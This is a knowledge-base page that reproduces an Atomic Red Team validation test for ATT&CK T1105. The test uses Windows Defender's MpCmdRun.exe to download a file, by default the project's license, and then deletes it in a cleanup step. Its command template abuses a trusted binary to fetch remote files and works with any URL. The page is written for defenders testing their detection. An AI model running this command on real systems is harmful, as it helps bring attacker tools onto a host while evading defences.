---
atomic_guid: "815bef8b-bf91-4b67-be4c-abe4c2a94ccc"
title: "Download a File with Windows Defender MpCmdRun.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "815bef8b-bf91-4b67-be4c-abe4c2a94ccc"
  - "Download a File with Windows Defender MpCmdRun.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Download a File with Windows Defender MpCmdRun.exe

Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).
The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
By default, the test downloads the Atomic Red Team license file to the temp directory.

More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/

## Metadata

- Atomic GUID: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### local_path

- description: Location to save downloaded file
- type: path
- default: %temp%\Atomic-license.txt

### remote_file

- description: URL of file to download
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

## Dependencies

Must have a Windows Defender version with MpCmdRun.exe installed

### Prerequisite Check

```untitled
cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
MpCmdRun.exe /?  >nul 2>&1
```

### Get Prerequisite

```untitled
Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually"
```

## Executor

- name: command_prompt

### Command

```cmd
cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
```

### Cleanup

```cmd
del #{local_path} >nul 2>&1
del %temp%\MpCmdRun.log >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
